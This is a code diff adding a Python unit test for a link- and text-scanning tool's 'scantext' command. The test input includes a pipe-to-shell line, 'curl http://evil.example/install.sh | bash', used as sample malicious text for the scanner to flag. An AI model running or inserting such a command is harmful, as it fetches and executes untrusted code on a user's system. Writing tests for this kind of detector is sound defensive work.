@@ -41,6 +41,20 @@ class RunLauncherTests(unittest.TestCase):
         self.assertEqual(exit_code, 0)
         print_result.assert_called_once_with("https://goggle.com", detailed=True)
 
+    def test_link_checker_scantext_command(self):
+        inputs = iter(["1", "scantext", "curl http://evil.example/install.sh | bash", "END", "exit"])
+        output = io.StringIO()
+
+        with patch("builtins.input", side_effect=lambda _prompt="": next(inputs)), patch(
+            "run.print_text_result"
+        ) as print_text_result, redirect_stdout(output):
+            exit_code = run.main()
+
+        self.assertEqual(exit_code, 0)
+        print_text_result.assert_called_once_with(
+            "curl http://evil.example/install.sh | bash", detailed=True
+        )
+
 
 if __name__ == "__main__":
     unittest.main()
